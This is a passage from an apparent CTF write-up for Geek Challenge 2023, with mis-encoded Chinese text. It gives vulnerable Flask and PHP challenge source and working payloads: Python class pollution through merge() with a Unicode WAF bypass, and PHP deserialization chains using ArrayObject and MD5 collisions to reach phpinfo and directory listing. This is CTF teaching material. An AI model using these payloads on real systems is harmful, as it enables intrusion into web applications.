class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;ä½ çš„æ•°å­—ä¸å¯¹å“¦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;è¿™ç§ç¥åŠŸä½ ä¸å……VIPä¹Ÿæƒ³å­¦?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;è¦ä¸væˆ‘50,æˆ‘é€ä½ ä¸€ä¸ªVIPå§,å˜»å˜»&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;å…ˆç™»å½•å»&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç ä¸­æœ‰ <code>merge()</code> å‡½æ•°ï¼Œå‚è€ƒï¼š<a href="https://tttang.com/archive/1876/">PythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python)</a></p><p>wafä¸­åŒ…å« <code>isvip</code>ï¼Œä½¿ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚</p><p>å¯¹è·¯ç”± <code>/register</code>ï¼ŒPOST <code>&#123;&quot;username&quot;:&quot;xx&quot;,&quot;password&quot;:&quot;yy&quot;,&quot;__class__&quot; : &#123;&quot;__base__&quot; : &#123;&quot;is\u0076ip&quot; : 1&#125;&#125;&#125;</code></p><p>å†ç™»å½•è®¿é—® <code>/flag</code>ï¼Œç”¨ <code>+</code> ç»•è¿‡åˆ¤æ–­ï¼š<code>/flag?num=+123456789</code>ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><blockquote><p>æˆ‘çš„å¥³ç¥å‘¢ï¼Ÿå¿«å¸®æˆ‘æ‰¾æ‰¾</p></blockquote><p>æºç åœ¨ <code>havefun.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;key.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;è¿›æ¥å•¦&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="variable">$randomString</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;bro===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;qwe;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;é”™äº†å“¥ä»¬,å†è¯•è¯•å§&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;å¥½ç´¯ï¼Œå¥½æƒ³ç¡ä¸€è§‰å•Š&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ä½ èƒ½æ‰¾åˆ°åŠ å¯†ç”¨çš„keyå’Œå¥¹çš„åå­—å—ï¼Ÿqwq&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">encode</span>(<span class="variable">$this</span>-&gt;hername,<span class="variable">$this</span>-&gt;key) === <span class="string">&#x27;vxvx&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;è§£å¯†æˆåŠŸï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;loveyou&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å¿«ç‚¹çš„ï¼Œæ€¥æ€¥æ€¥ï¼ï¼ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;çœŸçš„åªå·®ä¸€æ­¥äº†ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;å…„å¼Ÿæ€ä¹ˆæçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ç¡é¥±äº†ï¼Œæ¥ç€æ‰¾ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;seeyou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$seeyou</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="variable">$seeyou</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;QW))&lt;<span class="number">80</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;YXX)&lt;<span class="number">80</span>)&#123;</span><br><span class="line">                <span class="variable">$bool</span>=!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;QW)&amp;&amp;!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;QW) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;QW != <span class="variable language_">$this</span>-&gt;YXX) <span class="keyword">and</span> <span class="variable">$random</span>===<span class="string">&#x27;newbee&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$bool</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å¿«æ‹¿åˆ°æˆ‘çš„å°ç§˜å¯†äº†&lt;br&gt;&quot;</span>);</span><br><span class="line">                    <span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/HTTP/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>]));</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>])===<span class="string">&#x27;key.php&#x27;</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span>(<span class="string">&quot;æ‰¾åˆ°äº†ï¼ä½†å¥½åƒä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ€ä¹ˆåŠï¼Œæˆ‘å¥½æƒ³å¥¹&lt;br&gt;&quot;</span>);</span><br><span class="line">                            <span class="variable">$file</span> = <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">                            <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span>(<span class="string">&quot;ä½ åˆ«è¿™æ ·ï¼Œå¥¹ä¼šç”Ÿæ°”çš„â”­â”®ï¹â”­â”®&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å°±è¿™ç‚¹èƒ½è€ï¼Ÿæ€ä¹ˆå¸®æˆ‘æ‰¾åˆ°å¥¹(â•¥â•¯^â•°â•¥)&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are good,ä½ å¿«æ‰¾åˆ°æˆ‘çˆ±çš„é‚£ä¸ªå¥¹äº†&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$zhui</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$good</span>;  </span><br><span class="line">        <span class="variable">$zhui</span>[<span class="variable">$good</span>]();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ä¸æ˜¯å§ï¼Œç¬¬ä¸€å±‚éƒ½ç»•ä¸è¿‡å»ï¼Ÿï¼Ÿï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;å¿«å¸®æˆ‘æ‰¾æ‰¾å¥¹ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆååºåˆ—åŒ– <code>useless</code> ç±»çš„ <code>__destruct()</code> æ‹¿åˆ° <code>key.php</code>ï¼š</p><p>ç”¨ <code>ArrayObject</code> ç»•è¿‡ <code>/^[Oa]:[\d]+/i</code>ï¼Œmd5ç¢°æ’ï¼Œå†æ ¹æ® <code>and</code> çš„ä¼˜å…ˆçº§æ— è§† <code>$random</code>ï¼š</p><p><code>C:11:&quot;ArrayObject&quot;:196:&#123;x:i:0;O:7:&quot;useless&quot;:2:&#123;s:2:&quot;QW&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&quot;;s:3:&quot;YXX&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><code>basename()</code> ç»•è¿‡ <code>$_SERVER[&#39;PHP_SELF&#39;]</code>ï¼š</p><p><code>/havefun.php/key.php?user=C:11:%22ArrayObject%22:196:&#123;x:i:0;O:7:%22useless%22:2:&#123;s:2:%22QW%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2%22;s:3:%22YXX%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2%22;&#125;;m:a:0:&#123;&#125;&#125;&amp;a=PHP_SELF</code></p><p>å¾—åˆ°å›¾ç‰‡ï¼Œä¿¡æ¯æ˜¯ <code>key=9</code>ï¼š</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/download.jpg" alt="download" style="zoom: 50%;"></p><p>æœ€åå†æ¥ä¸€æ¬¡ååºåˆ—åŒ–é“¾è°ƒç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Me:__wakeup() ï¼ˆå¼•ç”¨ï¼‰</span><br><span class="line">her:__invoke()</span><br><span class="line">important:__sleep()</span><br><span class="line">useless:__get()</span><br><span class="line">her:find()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;qwe = <span class="keyword">new</span> her;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = &amp;<span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;asd = <span class="keyword">new</span> important;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="keyword">new</span> useless;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="keyword">array</span>(<span class="string">&#x27;seeyou&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> hez,<span class="string">&#x27;find&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hez</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hername = <span class="string">&#x27;momo&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Me</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><code>phpinfo()</code>ï¼Œä¿®æ”¹å¼•ç”¨11ä¸º13ï¼š</p><p><code>C:11:%22ArrayObject%22:260:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A13%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>ä¿®æ”¹å¼•ç”¨16ä¸º18ï¼Œæ”¹hezä¸ºherï¼š</p><p><code>C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;</code></p><p>æœ€ç»ˆpayloadï¼Œåˆ—ç›®å½•ï¼š</p><p><code>?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%